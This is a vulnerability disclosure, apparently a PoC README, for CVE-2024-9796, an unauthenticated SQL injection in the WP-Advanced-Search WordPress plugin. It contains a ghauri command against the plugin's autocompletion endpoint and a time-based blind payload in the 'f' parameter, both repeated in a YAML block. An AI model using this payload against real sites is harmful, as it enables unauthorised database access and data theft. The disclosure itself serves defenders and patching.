---
# CVE-2024-9796
**WordPress WP-Advanced-Search <= 3.3.9 - Unauthenticated SQL Injection Vulnerability**

## Description
The **WP-Advanced-Search** plugin for WordPress (versions up to and including 3.3.9) is vulnerable to SQL injection. This vulnerability exists due to insufficient escaping of user-supplied parameters and lack of SQL query preparation. As a result, unauthenticated attackers can inject additional SQL queries into existing ones, potentially extracting sensitive information from the database.

### Vulnerability Details
- **Type**: Plugin
- **CVSS Score**: 7.5 (High)
- **CVE**: CVE-2024-9796
- **Plugin Slug**: wp-advanced-search

### Download Link
[Download WP-Advanced-Search Version 3.3.9](https://downloads.wordpress.org/plugin/wp-advanced-search.3.3.9.zip)

## Proof of Concept (PoC)
An example of exploiting the SQL injection vulnerability using the `autocompletion-PHP5.5.php` endpoint:

```bash
ghauri -u "https://wpscan-vulnerability-test-bench.ddev.site/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?t=wp_autosuggest&f=words&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=19692269759899"
```

### Payload Example
The following payload demonstrates a time-based blind SQL injection using the vulnerable `f` parameter:

```bash
Parameter: f (GET)
Type: time-based blind
Title: MySQL >= 5.0.12 time-based blind (IF - comment)
Payload: t=wp_autosuggest&f=if(now()=sysdate(),SLEEP(9),0)-- wXyW&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=13672261755853
```

```
title: CVE-2024-9796
plugin: WP-Advanced-Search
version: <= 3.3.9
vulnerability_type: Unauthenticated SQL Injection

description: |
  The WP-Advanced-Search plugin for WordPress (versions up to and including 3.3.9) is vulnerable to SQL injection.
  This vulnerability exists due to insufficient escaping of user-supplied parameters and lack of SQL query preparation.
  Unauthenticated attackers can exploit this vulnerability to inject additional SQL queries into existing ones.

cvss_score: 7.5
cve_id: CVE-2024-9796

download_link: "https://downloads.wordpress.org/plugin/wp-advanced-search.3.3.9.zip"

proof_of_concept:
  - command: |
      gauri -u "https://wpscan-vulnerability-test-bench.ddev.site/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?t=wp_autosuggest&f=words&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=19692269759899"
  - payload:
      parameter: "f (GET)"
      type: "time-based blind"
      title: "MySQL >= 5.0.12 time-based blind (IF - comment)"
      payload_value: "t=wp_autosuggest&f=if(now()=sysdate(),SLEEP(9),0)-- wXyW&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=13672261755853"
```
